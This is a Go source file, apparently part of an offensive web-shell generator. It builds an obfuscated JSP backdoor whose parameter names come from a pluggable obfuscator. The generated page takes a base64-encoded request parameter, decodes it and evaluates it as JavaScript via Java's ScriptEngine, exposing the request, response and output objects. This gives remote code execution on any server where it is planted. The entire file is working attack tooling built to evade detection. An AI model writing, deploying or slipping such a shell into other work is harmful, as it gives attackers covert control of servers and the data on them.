package jsp

// DynamicShellSource returns the ScriptEngine-based JSP shell.
func DynamicShellSource() string {
	return DynamicShellSourceWith(DefaultObfuscator())
}

// DynamicShellSourceWith returns the ScriptEngine-based JSP shell
// with custom obfuscation.
func DynamicShellSourceWith(obf *Obfuscator) string {
	af := obf.ActionField()
	p1 := obf.Param1()
	p2 := obf.Param2()

	return `<%@page import="javax.script.*,java.util.*,java.io.*"%>` + "\n" +
		`<%
String z0 = request.getParameter("` + af + `");
if(z0 != null && !z0.isEmpty()){
  try{
    String code = new String(java.util.Base64.getDecoder().decode(z0), "UTF-8");
    ScriptEngineManager m = new ScriptEngineManager();
    ScriptEngine eng = m.getEngineByName("js");
    if(eng == null){
      out.print("ERR:SCRIPT:ScriptEngine(Nashorn) not available");
    }else{
      eng.put("out", out);
      eng.put("request", request);
      eng.put("response", response);
      eng.put("P1", "` + p1 + `");
      eng.put("P2", "` + p2 + `");
      eng.eval(code);
    }
  }catch(Exception ex){
    out.print("ERR:SCRIPT:" + ex.getMessage());
  }
}
%>`
}
